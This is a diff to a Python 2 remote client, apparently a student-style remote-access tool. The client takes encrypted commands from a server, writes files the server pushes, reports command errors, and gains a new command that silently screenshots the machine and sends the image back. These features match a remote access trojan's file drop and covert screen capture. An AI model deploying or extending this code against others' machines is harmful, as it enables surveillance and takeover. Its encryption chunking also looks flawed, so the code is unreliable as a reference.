@@ -5,7 +5,9 @@ Created on Mar 3, 2015
 '''
 
 import pickle
+import pyscreenshot as ImageGrab
 import socket
+import os
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from base64 import b64decode 
@@ -53,6 +55,8 @@ class Remoteclient:
                 cmd=cmd.strip('~')
             else:
                 print "server closed connection"
+            
+            
             if cmd=="FT":
                 rdata=""
                 filename= self.receiveData()
@@ -64,6 +68,8 @@ class Remoteclient:
                         rdata+=buf
                 with open(filename,'wb') as f:
                     f.write(rdata)
+            
+            
             elif cmd=="EFS":
                 print "inside EFS"
                 print self.receiveData()
@@ -83,16 +89,32 @@ class Remoteclient:
                 else:
                     self.sendData("Error Occured, Error Code is: "+str(stderr))
                 
+            
             elif cmd=="SCP":
-                print "Inside SCP"
-                print self.receiveData()
+                print "Taking screenshot"
+                ImageGrab.grab_to_file('testImage.png')
+                f=open('testImage.png','rb')
+                for filecontent in self.readFileinChunk(f):
+                    self.sendData(filecontent)
+                self.sendData("QUIT")
+                print "Screenshot sent successfully"
+            
+            
             else:
                 print "inside else block"
                 print self.receiveData()
+    
+    def readFileinChunk(self, obj, chunk_size=5461):
+        while True:
+            data=obj.read(chunk_size)
+            if not data:
+                break
+            yield data
+    
             
     def receiveData(self):
         while 1:
-            buf = self.sock.recv(4096)
+            buf = self.sock.recv(8192)
             if buf:
                 encmessage = b64decode(pickle.loads(buf))
                 msg= PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
@@ -104,22 +126,25 @@ class Remoteclient:
         self.sock.close()
                 
     def sendData(self, data):
+        count=0
         key = open("serverKey", "r").read() 
         serverKey= RSA.importKey(key)
         serverKey = PKCS1_OAEP.new(serverKey)
-        if(len(data)>100):
-            print "sending large data"
-            for i in range(100,len(data),100):
-                secretText = serverKey.encrypt(data[i-100:i])
+        print len(data)
+        if(len(data)>200):
+            for i in range(200,len(data),200):
+                count=count+1
+                secretText = serverKey.encrypt(data[i-200:i])
                 time.sleep(0.5)
                 self.sock.sendall(pickle.dumps(secretText.encode('base64')))
             secretText=serverKey.encrypt(data[(i):len(data)])
             time.sleep(0.5)
             self.sock.sendall(pickle.dumps(secretText.encode('base64')))
+            print count
             print "sent large data"
         else:
-            print "sending small data"
-            while len(data)<100:
+            print data
+            while len(data)<200:
                 data+='~'
             secretText=serverKey.encrypt(data)
             self.sock.sendall(pickle.dumps(secretText.encode('base64')))
